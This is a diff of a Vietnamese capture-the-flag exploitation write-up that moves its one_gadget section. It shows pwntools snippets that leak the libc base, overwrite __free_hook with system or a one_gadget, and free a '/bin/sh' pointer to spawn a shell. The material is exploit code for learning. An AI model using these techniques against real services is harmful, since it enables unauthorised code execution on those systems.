@@ -29,8 +29,7 @@ Leak libc:
     p.recvuntil(b'A'*0x48)
     libc.leak=u64(p.recv(6)+b'\x00\x00')
     libc.address=libc.leak-0x21b0a
-    
-## gọi system (cách 1)
+
 Khi đã có libc base thì ghi đè `system` vào `__free_hook`. Đồng thời gửi vào lệnh free 1 địa chỉ có chứa chuỗi `/bin/sh\0 ` để làm tham số cho `system`.
 
 Gọi system:
@@ -38,16 +37,6 @@ Gọi system:
     p.sendlineafter(b'To write: ',str(libc.sym['__free_hook']).encode())
     p.sendlineafter(b'With: ',str(libc.sym['system']).encode())
     p.sendlineafter(b'To free: ',str(next(libc.search(b'/bin/sh'))).encode())
-
-## gọi one_gadget (cách 2)
-
-<img width="866" height="392" alt="Screenshot 2026-11-10 172645" src="https://github.com/user-attachments/assets/0f7ea894-df05-4e6d-bf0a-903d21d3ddbe" />
-
-Gọi one_gadget:
-
-    p.sendlineafter(b'To write: ',str(libc.sym['__free_hook']).encode())
-    p.sendlineafter(b'With: ',str(one_gadget).encode())
-    p.sendlineafter(b'To free: ',p64(0))
 
 # Script Python (Gọi system)
 
@@ -73,3 +62,17 @@ Gọi one_gadget:
     p.sendlineafter(b'To free: ',str(next(libc.search(b'/bin/sh'))).encode())
     
     p.interactive()
+
+## Cách 2 (gọi one_gadget)
+
+<img width="866" height="392" alt="Screenshot 2026-11-10 172645" src="https://github.com/user-attachments/assets/0f7ea894-df05-4e6d-bf0a-903d21d3ddbe" />
+<img width="750" height="238" alt="image" src="https://github.com/user-attachments/assets/b6377153-1608-4a74-bcd9-c9a1c906103f" />
+
+<br><br>
+Vì điều kiện `[rsp+0x40] = NULL` thỏa nên có thể dùng one_gadget thứ 3.
+
+Gọi one_gadget:
+
+    p.sendlineafter(b'To write: ',str(libc.sym['__free_hook']).encode())
+    p.sendlineafter(b'With: ',str(one_gadget).encode())
+    p.sendlineafter(b'To free: ',p64(0))
